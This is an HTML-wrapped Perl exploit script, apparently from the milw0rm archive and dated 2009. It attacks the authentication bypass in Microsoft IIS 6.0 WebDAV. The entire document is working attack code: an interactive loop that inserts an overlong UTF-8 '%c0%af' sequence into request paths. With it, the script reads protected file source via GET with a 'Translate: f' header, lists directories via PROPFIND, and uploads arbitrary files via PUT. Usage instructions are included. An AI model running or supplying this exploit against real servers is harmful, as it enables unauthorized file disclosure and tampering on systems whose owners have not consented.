<html><head><title>Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit (pl)</title></head><pre>#!/usr/bin/perl -W
#
# Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit
# written by ka0x &lt;ka0x01[alt+64]gmail.com&gt;
# Advisory: http://www.milw0rm.com/exploits/8765
#
# Greets: an0de, Piker, xarnuz, NullWave07, Pepelux, k0rde, JoSs, Trancek and others!

use IO::Socket ;

my ( $host, $path ) = @ARGV ;
my $port = 80 ; # webserver port

&amp;usage unless $ARGV[1] ;

$host =~ s/http:\/\/// if($host =~ /^http:\/\//i) ;
$path =~ s/\/// if(substr($path, 0,1) eq '/');

sub _file {
	$file = shift ;
	open(FILE, $file) || die &quot;[-] ERROR: &quot;.$!,&quot;\n&quot; ;
	while( &lt;FILE&gt; ){
		$cont .= $_ ;
	}
	close(FILE) ;
	return $cont ;
}


print &quot;write 'help' for get help list\n&quot;;


while( 1 ) {

	my $sock = IO::Socket::INET-&gt;new (PeerAddr =&gt; $host, 
					PeerPort =&gt; $port,
					Proto    =&gt; 'tcp') || die &quot;\n[-] ERROR: &quot;.$!,&quot;\n&quot; ;
	print &quot;\$&gt; &quot;;
	chomp( my $option = &lt;STDIN&gt; ) ;
	last if $option eq 'quit' ;

	if($option eq 'source') {
		$path =~ s/\//%c0%af\// ; 
		print $sock &quot;GET /&quot;.$path.&quot; HTTP/1.1\r\n&quot; ; 
		print $sock &quot;Translate: f\r\n&quot; ;
		print $sock &quot;Host: &quot;.$host.&quot;\r\n&quot; ;
		print $sock &quot;Connection: close\r\n\r\n&quot; ;

		while(&lt;$sock&gt;){
			print $_ ;
		}
		close($sock) ;
	}


	elsif($option eq 'path') {
		$path =~ s/\//%c0%af\// ;
		print $sock &quot;PROPFIND  /&quot;.$path.&quot; HTTP/1.1\r\n&quot; ;
		print $sock &quot;Host: &quot;.$host.&quot;\r\n&quot; ;
		print $sock &quot;Connection:close\r\n&quot; ;
		print $sock 'Content-Type: text/xml; charset=&quot;utf-8&quot;'.&quot;\r\n&quot; ;
		print $sock &quot;Content-Length: 0\r\n\r\n&quot; ;
		print $sock  '&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;D:propfind xmlns:D=&quot;DAV:&quot;&gt;&lt;D:prop xmlns:R=&quot;http://www.foo.bar/boxschema/&quot;&gt;&lt;R:bigbox/&gt;&lt;R:author/&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;' ;

		while(&lt;$sock&gt;){
			print $_ ;
		}
		close($sock) ;
	}


	elsif($option eq 'put') {
		$path =~ s/\//%c0%af\// ;
		print &quot;[*] Insert a local file (ex: /root/file.txt): &quot; ;
		chomp( $local = &lt;STDIN&gt; ) ;
		$file_l = _file( $local ) ;
		print $sock &quot;PUT /&quot;.$path.&quot;my_file.txt HTTP/1.1\r\n&quot; ;
		print $sock &quot;Host: &quot;.$host.&quot;\r\n&quot; ;
		print $sock 'Content-Type: text/xml; charset=&quot;utf-8&quot;'.&quot;\r\n&quot; ;
		print $sock &quot;Connection:close\r\n&quot; ;
		print $sock &quot;Content-Length: &quot;.length($file_l).&quot;\r\n\r\n&quot; ;
		print $sock $file_l,&quot;\r\n&quot; ;

		while(&lt;$sock&gt;){
			print $_ ;
		}
		close($sock) ;
	}

	elsif($option eq 'help') {
		print &quot;\n\t\t- OPTIONS -\n\n\n&quot; ;
		print &quot;\thelp\t\tgive this help list\n&quot; ;
		print &quot;\tsource\t\tget file content\n&quot; ;
		print &quot;\tpath\t\tget directory contents\n&quot; ;
		print &quot;\tput\t\tput file\n&quot; ;
		print &quot;\tquit\t\texit exploit\n\n&quot; ;
	}
	
}

sub usage {
	print &lt;&lt; 'EOH' ;

  $ Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit
  $ written by ka0x &lt;ka0x01[at]gmail.com&gt;
  $ 25/05/2009

usage:
   perl $0 &lt;host&gt; &lt;path&gt;

example:
   perl $0 localhost dir/
   perl $0 localhost dir/file.txt

EOH

	exit;
}
	
	


__END__

# milw0rm.com [2009-05-26]</pre></html>